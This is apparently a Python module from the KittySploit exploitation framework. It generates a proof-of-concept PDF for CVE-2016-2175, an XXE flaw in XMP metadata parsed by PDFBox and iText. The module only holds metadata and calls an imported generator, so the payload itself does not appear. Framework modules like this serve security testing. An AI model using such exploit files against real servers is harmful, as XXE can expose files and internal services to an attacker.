#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.pdf.mixins import PdfCveMixin
from lib.pdf.generators.xxe import write_xxe_xmp_metadata


class Module(Auxiliary, PdfCveMixin):
    __info__ = {
        "name": 'PDF CVE-2016-2175 XXE XMP Metadata',
        "description": 'Generate PDF PoC for CVE-2016-2175: XXE in XMP /Metadata stream targeting server-side parsers (PDFBox, iText).',
        "author": ["KittySploit Team"],
        "cve": ['CVE-2016-2175'],
        "references": ['https://nvd.nist.gov/vuln/detail/CVE-2016-2175'],
        "tags": ['pdf', 'cve-2016-2175', 'xxe', 'xmp', 'pdfbox', 'itext'],
    }

    PDF_GENERATORS = (
        write_xxe_xmp_metadata,
    )

    CVE_IDS = ['CVE-2016-2175']
    MODULE_TITLE = 'PDF CVE-2016-2175 XXE XMP Metadata'

    def run(self):
        return self.run_pdf_cve()